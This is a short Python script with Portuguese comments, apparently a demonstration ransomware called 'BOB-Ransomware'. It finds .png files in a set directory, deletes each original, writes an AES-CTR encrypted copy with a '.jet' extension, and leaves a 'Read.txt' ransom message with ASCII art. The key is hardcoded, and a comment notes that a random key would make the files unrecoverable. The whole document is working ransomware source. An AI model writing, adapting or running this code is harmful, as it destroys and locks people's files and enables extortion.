import os
import binascii
import pyaes
import glob

#key = os.urandom(16) # Use somente se, não tiveres em interesse nos seus arquivos.
key = b"1234567890123456"  # Chave de 16 bytes (128 bits)

# Defina o diretório onde estão os arquivos ".png"
diretorio = "/home/jeiel/Área de Trabalho/YOUTUB3-main/BOB-Ransomware"

# Filtro
arquivos_jpg = glob.glob(os.path.join(diretorio, "*.png"))

for arquivo in arquivos_jpg:
    # Crie um novo nome de arquivo com a extensão .jet
    novo_arquivo = arquivo + ".jet" # Extensão personalizada
    
    with open(arquivo, "rb") as file:
        file_data = file.read()
    
    # Remova o arquivo original
    os.remove(arquivo)
    
    # Criptografe os dados usando AES
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)
    
    # Escreva os dados criptografados no novo arquivo
    with open(novo_arquivo, "wb") as file:
        file.write(crypto_data)
    
    # Escreva uma mensagem de texto e arte em um arquivo "Read.txt"
    texto = b"Seus arquivos foram codificados!"
    arte = b'''
         ________
       //       \\
      ||         ||
      ||         ||
      ||_________||
      |   _______ ||
      |  |       | |
      |__|_______|_|
    
    '''
    texto += arte
    arquivo_texto = open("Read.txt", "wb")
    arquivo_texto.write(texto)
    arquivo_texto.close()
